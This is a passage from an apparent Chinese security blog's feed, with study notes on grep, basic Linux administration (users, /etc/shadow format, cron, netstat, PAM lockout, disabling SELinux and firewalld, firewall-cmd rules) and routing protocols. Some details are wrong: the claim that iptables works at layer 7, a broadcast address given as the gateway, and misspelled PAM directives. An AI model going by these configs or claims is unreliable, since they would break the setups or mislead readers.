class="comment">#在多个文件中查找</span></span><br><span class="line">grep -v <span class="string">"text"</span> file_name<span class="comment">#-v选项，输出排除text之外的所有行</span></span><br><span class="line">grep -E <span class="string">"[1-9]+"</span><span class="comment">#-e选项，使用正则表达式</span></span><br><span class="line">grep -c <span class="string">"text"</span> file_name<span class="comment">#统计文件中匹配字符串的行数</span></span><br></pre></td></tr></table></figure><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><a href="https://www.jianshu.com/p/952188a96a3e" target="_blank" rel="noopener">三剑客笔试题集合</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;文本分析AWK&quot;&gt;&lt;a href=&quot;#文本分析AWK&quot; class=&quot;headerlink&quot; title=&quot;文本分析AWK&quot;&gt;&lt;/a&gt;文本分析AWK&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;awk&lt;/code&gt;是一种编程语言，用于在&lt;code&gt;linu
      
    
    </summary>
    
    
      <category term="【0】基础知识" scheme="https://wintrysec.github.io/categories/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
  </entry>
  
  <entry>
    <title>【7 操作系统】Linux基础命令</title>
    <link href="https://wintrysec.github.io/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8BLinux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
    <id>https://wintrysec.github.io/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8BLinux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</id>
    <published>2020-08-12T12:07:00.000Z</published>
    <updated>2020-08-12T08:40:50.011Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">pwd</span>、<span class="built_in">cd</span> 、ls -al、touch、mkdir</span><br><span class="line">cp、mv、rm、find / -name xx* 、du(计算目录容量)</span><br><span class="line">cat、more (逐页阅读,空格下一页，b返回上一页)</span><br><span class="line">head -n 2 xx.txt<span class="comment">#查看前两行</span></span><br><span class="line">tail -n 3 ca.*<span class="comment">#查看ca开头的文件的后3行</span></span><br><span class="line">grep<span class="comment">#正则匹配，搜索文本</span></span><br><span class="line"><span class="built_in">echo</span><span class="comment">#用于在shell中打印shell变量的值，或者直接输出指定的字符串</span></span><br><span class="line">ln -s 源文件 目标文件<span class="comment">#(-s软链接、不可删除源文件；硬链接时，源文件只能为文件不能是目录)</span></span><br><span class="line"></span><br><span class="line">wc <span class="comment">#显示文件的行、单词、字节统计信息（-l、-w、-c）</span></span><br><span class="line"></span><br><span class="line">Vim工作模式：普通模式、插入模式(i)、命令模式(:)</span><br><span class="line">Vim查找替换：普通模式下-&gt; /向下查找 ?向上查找 n跳到下一个匹配处</span><br></pre></td></tr></table></figure><h1 id="账户管理"><a href="#账户管理" class="headerlink" title="账户管理"></a>账户管理</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">id<span class="comment">#打印用户的UID和GID，root组的GID号是：0，bin组GID号是：1，daemon组GID号是：2，sys组GID号是：3</span></span><br><span class="line">passwd<span class="comment">#后单跟用户名跟改密码</span></span><br><span class="line">-l<span class="comment">#锁定用户不能跟改密码</span></span><br><span class="line">-d<span class="comment">#清除用户密码</span></span><br><span class="line">-S<span class="comment">#查询用户密码状态</span></span><br><span class="line"></span><br><span class="line">useradd<span class="comment">#添加用户，-d指定家目录，-g指定主要组，-G指定次要组，-s指定缺省shell</span></span><br><span class="line">groupadd<span class="comment">#添加组，-g指定组ID</span></span><br><span class="line">usermod<span class="comment">#修改用户信息，-e有效期，-f宽限天数，-l账户名称，-L锁定用户，-u修改用户ID</span></span><br><span class="line">userdel<span class="comment">#删除用户，-f强制删除 即使用户已登录，-r同时删除用户相关所有文件</span></span><br><span class="line">groupdel<span class="comment">#删除工作组</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#账户信息文件：/etc/passwd</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">用户名：密码：用户ID：组ID：用户说明(描述)：用户主(家)目录：缺省shell(登陆后的shell)</span><br><span class="line">注意：无密码只允许本机登陆，远程不允许登陆</span><br><span class="line"></span><br><span class="line"><span class="comment">#账户密码文件：/etc/shadow</span></span><br><span class="line">root:<span class="variable">$Gs1qhL2p3ZetrE4</span>.kMHx6qgbTcjQSt.Ft7ql1WpkopY/:16809:0:99999:7:::</span><br><span class="line">用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：</span><br><span class="line">密码有效期：密码到期的警告天数：密码过期宽限天数：账号失效时间：保留</span><br><span class="line"></span><br><span class="line"><span class="comment">#组账户信息文件：/etc/group</span></span><br><span class="line">root:x:0:</span><br><span class="line">组名：口令：组标识号：组内用户列表</span><br><span class="line"></span><br><span class="line">who<span class="comment">#查看当前登录用户（tty本地登陆  pts远程登录）</span></span><br><span class="line">w<span class="comment">#查看系统信息，想知道某一时刻用户的行为</span></span><br><span class="line">uptime<span class="comment">#查看登陆多久、多少用户，负载</span></span><br></pre></td></tr></table></figure><h1 id="文件和目录权限管理"><a href="#文件和目录权限管理" class="headerlink" title="文件和目录权限管理"></a>文件和目录权限管理</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">drwx-rwx-rwx <span class="comment">#d代表目录、读、写、执行（4、2、1） -&gt; user、group、other -&gt; 所有者用户、组、其他用户的权限</span></span><br><span class="line">chmod <span class="comment">#改变文件和目录权限</span></span><br><span class="line">chown <span class="comment">#改变文件和目录所有者和组</span></span><br></pre></td></tr></table></figure><h1 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h1><p>都是以当前用户的权限去执行计划任务的</p><h2 id="at一次性计划任务"><a href="#at一次性计划任务" class="headerlink" title="at一次性计划任务"></a>at一次性计划任务</h2><p>需要开启<code>atd</code>服务(需要root权限)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /etc/init.d/atd restart</span><br></pre></td></tr></table></figure><p><strong>at的运行方式</strong></p><p>事实上我们仅使用at命令来生成所要运行的工作，并将这个工作以文本文件的方式写入/var/spool/at目录内</p><p>该工作就可以被<code>atd</code>服务取用并执行，at的实际工作情况是这样的： </p><blockquote><p>1：先查找<code>/etc/at.allow</code>文件，写在这个文件中的用户才可以使用at，没有在<code>at.allow</code>文件中的用户就不可以使用，即使<code>at.deny</code>中也没有</p><p>2：如果<code>at.allow</code>不存在，就查找<code>/etc/at.deny</code>，写在这个文件中的用户都不能使用at，而其他用户都可以使用at</p><p>3：如果两个文件都不存在，那么就只有root用户可以执行at</p></blockquote><p><strong>选项参数：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-l<span class="comment">#相当于atq，列出系统上该用户的所有at调度</span></span><br><span class="line">-d<span class="comment">#相当于atrm，取消一个在at中调度的工作</span></span><br><span class="line">-v<span class="comment">#使用较明显的时间格式列出at调度中的任务列表</span></span><br><span class="line">-c<span class="comment">#查看at计划任务的具体内容，后接job名</span></span><br><span class="line"></span><br><span class="line">$ at 18:00</span><br><span class="line">at&gt;sh cmd.sh</span><br><span class="line">at&gt;(输入ctrl+d)</span><br></pre></td></tr></table></figure><h2 id="crontab-周期性计划任务"><a href="#crontab-周期性计划任务" class="headerlink" title="crontab 周期性计划任务"></a>crontab 周期性计划任务</h2><p>(user权限不能查看<code>www-data</code>权限的任务)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-u<span class="comment">#只有root用户可以执行这个任务，也即帮其他用户新建、删除任务</span></span><br><span class="line">-e<span class="comment">#edit user's crontab</span></span><br><span class="line">-l<span class="comment">#list user's crontab</span></span><br><span class="line">-r<span class="comment">#delete user's crontab</span></span><br><span class="line">-i<span class="comment">#prompt before deleting user's crontab</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#================#</span></span><br><span class="line"><span class="comment">#======例子======#</span></span><br><span class="line"><span class="comment">#================#</span></span><br><span class="line"></span><br><span class="line">0 12 * * * sh shell.sh</span><br><span class="line"><span class="comment">#上边这条任务代表每天12点执行一次 sh shell.sh</span></span><br></pre></td></tr></table></figure><p>前面5个字段分别表示<strong>分钟</strong>，<strong>小时</strong>，<strong>日期</strong>，<strong>月份</strong>，<strong>周</strong>，后面接的是命令</p><table><thead><tr><th>代表意义</th><th>分钟</th><th>小时</th><th>日期</th><th>月份</th><th>周</th><th>命令</th></tr></thead><tbody><tr><td>数字范围</td><td>0-59</td><td>0-23</td><td>0-31</td><td>0-12</td><td>0-7</td><td>要执行的命令</td></tr></tbody></table><p>其中周里面的0和7都代表周日，注意周与日月不可并存</p><p><strong>特殊字符：</strong></p><table><thead><tr><th>特殊字符</th><th>代表意义</th></tr></thead><tbody><tr><td>*（星号）</td><td>任意时刻，如0 12 * * * sh <code>shell.sh</code>的*代表每个月的每个周中的每一天</td></tr><tr><td>,（逗号）</td><td>代表分割时段，例如0 3,6 * * * command，表示在3点和6点时执行任务，<strong>注意不要有空格符</strong></td></tr><tr><td>-（减号）</td><td>代表时间段范围，例如在凌晨1点到6点的30分的时候执行command命令则应该是 30 1-6 * * * command</td></tr><tr><td>/n</td><td>表示每隔n个单位间隔执行一次的意思，*/11-23 * * * command表示凌晨1到晚上23点时间段内每隔1分钟执行一次</td></tr></tbody></table><h1 id="网络监控netstat"><a href="#网络监控netstat" class="headerlink" title="网络监控netstat"></a>网络监控netstat</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat<span class="comment">#打印网络连接、路由表、网络接口统计信息</span></span><br><span class="line">-a<span class="comment">#显示所有socket，包括正在监听的</span></span><br><span class="line">-s <span class="comment">#显示各种协议统计信息</span></span><br><span class="line">-n <span class="comment">#使用数字形式的IP</span></span><br><span class="line">-p <span class="comment">#显示进程及对应ID号</span></span><br><span class="line">-l <span class="comment">#显示正在监听的sockets接口信息</span></span><br><span class="line">-u <span class="comment">#查看udp连接信息</span></span><br><span class="line">-t <span class="comment">#查看tcp连接信息</span></span><br><span class="line">-o<span class="comment">#显示计时器</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#确认是否受到DDOS攻击</span></span><br><span class="line">netstat -ntu | awk <span class="string">'&#123;print $5&#125;'</span> | cut -d: -f1 | sort | uniq -c | sort -n</span><br><span class="line"><span class="comment">#每个IP几个、十几个或几十个连接数都还算比较正常，如果成百上千肯定就不正常了</span></span><br></pre></td></tr></table></figure><p><strong>查看当前端口连接</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -antp</span><br><span class="line">ss -l</span><br></pre></td></tr></table></figure><p>ss的优势在于它能够显示更多更详细的有关TCP和连接状态的信息，而且比netstat更快速更高效。</p><h1 id="进程监控"><a href="#进程监控" class="headerlink" title="进程监控"></a>进程监控</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps <span class="comment">#查看当前进程信息 -&gt; ps aux |grep 关键字 -&gt; 配合kill杀死进程 -&gt; kill -9 pid</span></span><br></pre></td></tr></table></figure><p><strong>Linux上进程有5种状态:</strong> </p><blockquote><ol><li><p><strong>运行</strong>          (正在运行或在运行队列中等待)</p></li><li><p><strong>中断</strong>          (休眠中, 受阻, 在等待某个条件的形成或接受到信号)</p></li><li><p><strong>不可中断</strong>   (收到信号不唤醒和不可运行, 进程必须等待直到有中断发生)</p></li><li><p><strong>僵死</strong>          (进程已终止, 但进程描述符存在, 直到父进程调用wait4()系统调用后释放)</p></li><li><p><strong>停止</strong>          (进程收到SIGSTOP, SIGSTP, SIGTIN, SIGTOU信号后停止运行运行)</p></li></ol></blockquote><p><strong><code>ps aux</code>输出格式：</strong></p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND</span><br></pre></td></tr></table></figure><p><strong>格式说明：</strong></p><blockquote><p><code>USER</code>: 行程拥有者</p><p><code>PID: pid</code></p><p><code>%CPU</code>: 占用的 CPU 使用率</p><p><code>%MEM</code>: 占用的记忆体使用率</p><p><code>VSZ</code>: 占用的虚拟记忆体大小</p><p><code>RSS</code>: 占用的记忆体大小</p><p>TTY: 终端的次要装置号码 (minor device number of tty)</p><p>STAT: 该行程的状态，<code>linux</code>的进程有5种状态：</p><ul><li>D 不可中断 <code>uninterruptible</code> sleep (usually IO)</li><li>R 运行 runnable (on run queue)</li><li>S 中断 sleeping</li><li>T 停止 traced or stopped</li><li>Z 僵死 a defunct (”zombie”) process</li></ul><p>​     注: 其它状态还包括W(无驻留页), &lt;(高优先级进程), N(低优先级进程), L(内存锁页)</p><p>START: 行程开始时间</p><p>TIME: 执行的时间</p><p>COMMAND:所执行的指令</p></blockquote><p><strong>实例</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1) ps a 显示现行终端机下的所有程序，包括其他用户的程序。</span><br><span class="line">2）ps -A 显示所有程序。 </span><br><span class="line">3）ps c 列出程序时，显示每个程序真正的指令名称，而不包含路径，参数或常驻服务的标示。 </span><br><span class="line">4）ps -e 此参数的效果和指定<span class="string">"A"</span>参数相同。 </span><br><span class="line">5）ps e 列出程序时，显示每个程序所使用的环境变量。 </span><br><span class="line">6）ps f 用ASCII字符显示树状结构，表达程序间的相互关系。 </span><br><span class="line">7）ps -H 显示树状结构，表示程序间的相互关系。 </span><br><span class="line">8）ps -N 显示所有的程序，除了执行ps指令终端机下的程序之外。 </span><br><span class="line">9）ps s 采用程序信号的格式显示程序状况。 </span><br><span class="line">10）ps S 列出程序时，包括已中断的子程序资料。 </span><br><span class="line">11）ps -t 　指定终端机编号，并列出属于该终端机的程序的状况。 </span><br><span class="line">12）ps u 　以用户为主的格式来显示程序状况。 </span><br><span class="line">13）ps x 　显示所有程序，不以终端机来区分。</span><br><span class="line"></span><br><span class="line"><span class="comment">#ps是显示当前状态处于running的进程，grep表示在这些里搜索，而ps aux是显示所有进程和其状态。</span></span><br><span class="line"></span><br><span class="line">$ ps aux | grep amoeba<span class="comment">#查到amoeba的进程</span></span><br><span class="line">$ <span class="built_in">kill</span> -s 9 pid<span class="comment">#杀死进程</span></span><br></pre></td></tr></table></figure><h1 id="Linux密码错误锁定"><a href="#Linux密码错误锁定" class="headerlink" title="Linux密码错误锁定"></a>Linux密码错误锁定</h1><p>设置Linux用户连续5次输入错误密码进行登陆时，自动锁定10分钟</p><blockquote><p> Linux有一个pam_tally2.so的PAM模块，来限定用户的登录失败次数，如果次数达到设置的阈值，则锁定用户 </p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/pam.d/login</span><br><span class="line"></span><br><span class="line"><span class="comment">#%PAM-1.0 </span></span><br><span class="line">authrequired pam_tally2.so deny=5 ulock_time=600 even_deny_root root_unlock_time=600<span class="comment">#在顶部写入，否则就算锁定也能登录</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#参数解释</span></span><br><span class="line">even_deny_root<span class="comment">#也限制root用户；</span></span><br><span class="line">deny<span class="comment">#设置普通用户和root用户连续错误登陆的最大次数，超过最大次数，则锁定该用户</span></span><br><span class="line">unlock_time<span class="comment">#设定普通用户锁定后，多少时间后解锁，单位是秒；</span></span><br><span class="line">root_unlock_time<span class="comment">#设定root用户锁定后，多少时间后解锁，单位是秒；</span></span><br></pre></td></tr></table></figure><blockquote><p> 此处使用的是 pam_tally2 模块，如果不支持 pam_tally2 模块可以使用 pam_tally 模块 </p><p> 不同的pam版本，设置可能有所不同，具体使用方法，可以参照相关模块的使用规则 </p></blockquote><p><strong>限制远程登录</strong></p><p>上边的方法只是限制了用户从tty登录，而没有限制远程登录，如果想限制远程登录，需要改SSHD文件 </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/pam.d/sshd</span><br><span class="line"></span><br><span class="line"><span class="comment">#%PAM-1.0</span></span><br><span class="line">authrequired pam_tally2.so deny=5 ulock_time=600 even_deny_root root_unlock_time=600<span class="comment">#同样是添加在顶部第二行</span></span><br></pre></td></tr></table></figure><p><strong>查看用户登录失败次数</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/pam.d/</span><br><span class="line">pam_tally2 --user root</span><br></pre></td></tr></table></figure><p><strong>解锁指定用户</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/pam.d/</span><br><span class="line">pam_tally2 -r -u root</span><br><span class="line"></span><br><span class="line"><span class="comment">#清空某一用户错误登陆次数：</span></span><br><span class="line">pam_tally --user username --reset</span><br></pre></td></tr></table></figure><h1 id="获取-proc目录信息"><a href="#获取-proc目录信息" class="headerlink" title="获取/proc目录信息"></a>获取/proc目录信息</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls /proc<span class="comment">#系统信息，硬件信息，内核版本，加载的模块，进程；可以用来提升权限</span></span><br></pre></td></tr></table></figure><p>其中的部分文件分别对应正在运行的进程，可用于访问当前进程的地址空间。</p><p>它是一个非常特殊的虚拟文件系统，其中并不包含“实际的”文件，而是可用以引用当前运行系统的系统信息，</p><p>如CPU、内存、运行时间、软件配置以及硬件配置的信息，这些信息是在内存中由系统自己产生的。</p><p><code>/proc/net</code>   其中的文件分别表示各种网络协议（如TCP、UDP以及ARP等）的状态与统计信息。<br><code>/proc/sys</code>  这个目录不仅存有各种系统信息，而且也包含系统内核与TCP/IP网络的可调参数。</p><p>其中的kernel子目录含有共享内存和消息队列的可调参数，net子目录中含有TCP/IP的各种可调参数。 </p><h1 id="Centos系统设置"><a href="#Centos系统设置" class="headerlink" title="Centos系统设置"></a>Centos系统设置</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Centos最小化安装时没有ifconfig等命令</span></span><br><span class="line">yum whatprovides ifconfig <span class="comment">#查看那个组件包,包含了 ifconfig 命令</span></span><br><span class="line">yum -y install net-tools<span class="comment">#安装组件包</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#配置静态 IP 地址并访问互联网</span></span><br><span class="line">vi /etc/sysconfig/network-scripts/ifcfg-ens33</span><br><span class="line"></span><br><span class="line">BOOTPROTO=dhcp/static <span class="comment">#静态 IP</span></span><br><span class="line">IPADDR=192.168.1.11 <span class="comment">#本机地址</span></span><br><span class="line">NETMASK=255.255.255.0 <span class="comment">#子网掩码</span></span><br><span class="line">GATEWAY=192.168.1.255 <span class="comment">#默认网关</span></span><br><span class="line"></span><br><span class="line">vi /etc/resolv.conf</span><br><span class="line">nameserver 114.114.114.114<span class="comment">#配置DNS</span></span><br><span class="line"></span><br><span class="line">service network restart <span class="comment">#重启网络</span></span><br></pre></td></tr></table></figure><h3 id="防火墙-FireWall-和-SELinux-打开和关闭"><a href="#防火墙-FireWall-和-SELinux-打开和关闭" class="headerlink" title="防火墙 FireWall 和 SELinux 打开和关闭"></a><strong>防火墙 FireWall 和 SELinux 打开和关闭</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">firewall-cmd --state<span class="comment">#查看防火墙状态</span></span><br><span class="line">systemctl start firewall.service<span class="comment">#开启防火墙</span></span><br><span class="line">systemctl stop firewall.service<span class="comment">#停止防火墙</span></span><br><span class="line">systemctl <span class="built_in">disable</span> firewall.service<span class="comment">#禁止开机启动</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#SELinux是「Security-Enhanced Linux」的简称；</span></span><br><span class="line"><span class="comment">#是Linux的一个扩张强制访问控制安全模块</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#临时关闭SELinux，1启用</span></span><br><span class="line">setenforce 0</span><br><span class="line"></span><br><span class="line"><span class="comment">#永久关闭</span></span><br><span class="line">vim /etc/selinux/config/  --&gt; SELINUX=disabled</span><br><span class="line"></span><br><span class="line"><span class="comment"># SELINUX参数enforcing代表打开，disabled代表关闭</span></span><br><span class="line"><span class="comment"># 查看selinux状态： getenforce</span></span><br></pre></td></tr></table></figure><h3 id="配置防火墙"><a href="#配置防火墙" class="headerlink" title="配置防火墙"></a><strong>配置防火墙</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查询端口是否开放</span></span><br><span class="line">firewall-cmd --query-port=80/tcp</span><br><span class="line"></span><br><span class="line"><span class="comment">#开放80端口</span></span><br><span class="line">firewall-cmd --permanent --add-port=80/tcp</span><br><span class="line"></span><br><span class="line"><span class="comment">#移除端口</span></span><br><span class="line">firewall-cmd --permanent --remove-port=80/tcp</span><br><span class="line"></span><br><span class="line"><span class="comment">#重启防火墙(修改配置后要重启防火墙)</span></span><br><span class="line">firewall-cmd --reload</span><br><span class="line"></span><br><span class="line"><span class="comment">#参数解释</span></span><br><span class="line">1、firwall-cmd：是Linux提供的操作firewall的一个工具；</span><br><span class="line">2、--permanent：表示设置为持久；</span><br><span class="line">3、--add-port：标识添加的端口；</span><br><span class="line"></span><br><span class="line"><span class="comment">#针对某个 IP开放端口</span></span><br><span class="line">firewall-cmd --permanent --add-rich-rule=<span class="string">"rule family="</span>ipv4<span class="string">" source address="</span>192.168.189.128<span class="string">" port protocol="</span>tcp<span class="string">" port="</span>80<span class="string">" accept"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#删除某个IP</span></span><br><span class="line">firewall-cmd --permanent --remove-rich-rule=<span class="string">"rule family="</span>ipv4<span class="string">" source address="</span>192.168.189.128<span class="string">" accept"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#针对一个ip段允许访问</span></span><br><span class="line">firewall-cmd --permanent --add-rich-rule=<span class="string">"rule family="</span>ipv4<span class="string">" source address="</span>192.168.0.0/16<span class="string">" accept"</span></span><br><span class="line">firewall-cmd --permanent --add-rich-rule=<span class="string">"rule family="</span>ipv4<span class="string">" source address="</span>192.168.1.0/24<span class="string">" port protocol="</span>tcp<span class="string">" port="</span>9200<span class="string">" accept"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#重启防火墙(修改配置后要重启防火墙)</span></span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><h3 id="iptables工作在TCPIP模型中的第七层，应用层"><a href="#iptables工作在TCPIP模型中的第七层，应用层" class="headerlink" title="iptables工作在TCPIP模型中的第七层，应用层"></a>iptables工作在TCPIP模型中的第七层，应用层</h3><blockquote><p>目前市面上比较常见的有3、4层的防火墙，叫网络层的防火墙，还有7层的防火墙，其实是代理层的网关。</p><p>对于TCP/IP的七层模型来讲，我们知道第三层是网络层，三层的防火墙会在这层对源地址和目标地址进行检测。</p><p>但是对于七层的防火墙，不管你源端口或者目标端口，源地址或者目标地址是什么，都将对你所有的东西进行检查。</p><p>所以，对于设计原理来讲，七层防火墙更加安全，但是这却带来了效率更低。</p><p>所以市面上通常的防火墙方案，都是两者结合的。</p><p>而又由于我们都需要从防火墙所控制的这个口来访问</p><p>所以防火墙的工作效率就成了用户能够访问数据多少的一个最重要的控制</p><p>配置的不好甚至有可能成为流量的瓶颈。</p></blockquote><p>附：<a href="https://www.linuxcool.com/" target="_blank" rel="noopener">Linux命令手册</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;pwd&lt;/span&gt;、&lt;span class=&quot;built_in&quot;&gt;
      
    
    </summary>
    
    
      <category term="【0】基础知识" scheme="https://wintrysec.github.io/categories/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
  </entry>
  
  <entry>
    <title>【6 网络基础】路由协议</title>
    <link href="https://wintrysec.github.io/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/6%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%8B%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE/"/>
    <id>https://wintrysec.github.io/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/6%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%8B%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE/</id>
    <published>2020-08-12T12:06:00.000Z</published>
    <updated>2020-08-12T08:40:47.816Z</updated>
    
    <content type="html"><![CDATA[<h1 id="路由协议基础"><a href="#路由协议基础" class="headerlink" title="路由协议基础"></a>路由协议基础</h1><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><blockquote><p>路由（Routing）是数据通信网络中一个基本的概念。</p><p>路由就是通过互联的网络把信息从源地址传输到目的地址的活动。</p><p>路由发生在OSI网络参考模型中的第三层（即网络层）。</p><p>我们将具有路由转发功能的设备称为广义上的路由器。</p></blockquote><p>当路由器收到一个IP数据包，路由器会根据目的IP地址在设备上的路由表（Routing Table）中进行查找，</p><p>找到“最匹配”的路由条目后，将数据包根据路由条目所指示的出接口或下一跳IP转发出去。</p><p>路由表中装载着路由器通过各种途径获知的路由条目（Routes）。</p><p>路由器可通过静态、动态等方式获取路由条目并维护自己的路由表。</p><h3 id="常见路由协议分类"><a href="#常见路由协议分类" class="headerlink" title="常见路由协议分类"></a><strong>常见路由协议分类</strong></h3><blockquote><ul><li>OSPF（Open Shortest Path First）</li><li>RIP（Routing Information Protocol）</li><li>IS-IS（Intermediate System to Intermediate System）</li><li>BGP（Border Gateway Protocol）</li></ul><p>其中，<strong>最多</strong>被使用到的路由协议为<strong>OSPF和BGP</strong>。</p></blockquote><ul><li>按照路由协议使用的<strong>算法</strong>分：<ul><li>距离矢量路由协议，例如：RIP和BGP。其中，BGP也被称为路径矢量协议（Path-Vector Protocol） </li><li>链路状态路由协议，例如：OSPF 和IS-IS。</li></ul></li><li>按照路由协议<strong>作用的区域</strong>划分：<ul><li>内部网关协议<strong>IGP</strong>（Interior Gateway Protocol），在单一的自治系统中交换路由信息，例如：OSPF、RIP、IS-IS</li><li>外部网关协议<strong>EGP</strong>（Exterior Gateway Protocol），在不同的自治系统中交换路由信息，例如：BGP</li></ul></li></ul><h3 id="路由器基本原理"><a href="#路由器基本原理" class="headerlink" title="路由器基本原理"></a><strong>路由器基本原理</strong></h3><p>在因特网中，网络连接设备用来控制网络流量和保证网络数据传输质量。</p><p>常见的网络连接设备有集线器（Hub）、网桥（Bridge）、交换机（Switch）和路由器（Router） </p><p><strong>路由就是报文从源端到目的端的路径。</strong></p><p>当报文从路由器到目的网段有多条路由可达时，路由器可以根据路由表中最佳路由进行转发。</p><p>最佳路由的选取与发现此路由的路由协议的优先级、路由的度量有关。</p><p>当多条路由的协议优先级与路由度量都相同时，可以实现负载分担，缓解网络压力；</p><p>当多条路由的协议优先级与路由度量不同时，可以构成路由备份，提高网络的可靠性。 </p><h3 id="路由迭代"><a href="#路由迭代" class="headerlink" title="路由迭代"></a><strong>路由迭代</strong></h3><blockquote><p>路由必须有直连的下一跳才能够指导转发，但是路由生成时下一跳可能不是直连的</p><p>因此需要计算出一个直连的下一跳和对应的出接口，这个过程就叫做路由迭代。 </p></blockquote><p>BGP路由、静态路由和UNR路由的下一跳都有可能不是直连的，都需要进行路由迭代。 </p><h1 id="静态路由与动态路由"><a href="#静态路由与动态路由" class="headerlink" title="静态路由与动态路由"></a>静态路由与动态路由</h1><blockquote><ul><li>通过<strong>链路层协议</strong>发现的路由称为<strong>直连路由</strong>。</li><li>通过网络管理员<strong>手动配置</strong>的路由称为<strong>静态路由</strong>。</li><li>通过<strong>动态路由协议</strong>发现的路由称为<strong>动态路由</strong>。</li></ul></blockquote><p><strong>静态路由</strong>配置方便，对系统要求低，适用于拓扑结构简单并且稳定的小型网络。缺点是不能自动适应网络拓扑的变化，需要人工干预。</p><p><strong>动态路由</strong>协议有自己的路由算法，能够自动适应网络拓扑的变化，适用于具有一定数量三层设备的网络。</p><p>缺点是配置对用户要求比较高，对系统的要求高于静态路由，并将占用一定的网络资源和系统资源。 </p><h1 id="路由表和FIB表"><a href="#路由表和FIB表" class="headerlink" title="路由表和FIB表"></a>路由表和FIB表</h1><blockquote><p>路由器转发数据包的关键是路由表和FIB表，每个路由器都至少保存着一张路由表和一张FIB（<strong>Forwarding Information Base</strong>）表。</p><p>路由器通过路由表选择路由，通过FIB表指导报文进行转发。</p></blockquote><h3 id="路由表"><a href="#路由表" class="headerlink" title="路由表"></a><strong>路由表</strong></h3><p>每台路由器中都保存着一张本地核心路由表（即设备的IP路由表），同时各个路由协议也维护着自己的路由表。 </p><p><strong>本地核心路由表</strong></p><p>路由器使用本地核心路由表用来保存决策优选路由，并负责把优选路由下发到FIB表，通过FIB表指导报文进行转发。</p><p>这张路由表依据各种路由协议的优先级和度量值来选取路由。</p><p><strong>协议路由表</strong></p><p>协议路由表中存放着该协议发现的路由信息。路由协议可以引入并发布其他协议生成的路由。</p><p>例如，在路由器上运行OSPF协议，需要使用OSPF协议通告直连路由、静态路由或者IS-IS路由时，要将这些路由引入到OSPF协议的路由表中。</p><p><strong>查看路由器的路由表概要信息</strong></p><p>在路由器中，执行命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">display ip routing-table</span><br><span class="line"></span><br><span class="line"><span class="comment">#示例结果</span></span><br><span class="line">Destination/Mask    Proto   Pre  Cost      Flags NextHop         Interface      </span><br><span class="line">                                                                                </span><br><span class="line">     